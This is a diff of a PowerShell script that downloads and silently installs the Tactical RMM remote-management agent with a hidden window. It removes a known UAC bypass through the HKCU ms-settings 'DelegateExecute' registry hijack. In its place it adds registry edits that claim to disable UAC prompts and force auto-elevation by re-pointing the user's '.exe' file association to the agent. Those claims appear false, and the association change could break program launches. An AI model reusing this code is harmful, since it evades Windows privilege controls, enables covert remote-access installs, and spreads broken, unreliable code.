@@ -57,29 +57,28 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
     if ($connectresult.TcpTestSucceeded -eq $true){
         Try
         {  
-
-    
-
-   
-
             Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
             Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT', '/SUPPRESSMSGBOXES' -WindowStyle Hidden -Wait
             Write-Host ('Extracting...')
             Start-Sleep -Seconds 5
     #UAC_CODE_START
-            New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-            New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-            Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+$program = "C:\Program Files\TacticalAgent\tacticalrmm.exe"  # Specify the path to your executable file
+
+# Create a registry key for the application
+New-Item "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Force
+
+# Set the "RunAs" value to an empty string to disable the UAC prompt
+Set-ItemProperty -Path "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Name "RunAs" -Value ""
+
+# Set the "RunAsAdmin" value to 1 to enable auto-elevation
+Set-ItemProperty -Path "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Name "RunAsAdmin" -Value 1
+
+# Associate the file type with the application to trigger auto-elevation
+New-Item "HKCU:\Software\Classes\.exe" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\.exe" -Name "" -Value "Applications\tacticalrmm.exe" -PropertyType String -Force
     #UAC_CODE_END
             Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList ($installArgs + "--silent") -WindowStyle Hidden -Wait
            
-           # Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
-            #Start-Process -FilePath $OutPath\$output -ArgumentList ('/VERYSILENT /SUPPRESSMSGBOXES') -Wait
-            #write-host ('Extracting...')
-            #Start-Sleep -s 5
-            #Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList ($installArgs + '--silent') -Wait
-
-           # Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList $installArgs -Wait
             exit 0
         }
         Catch
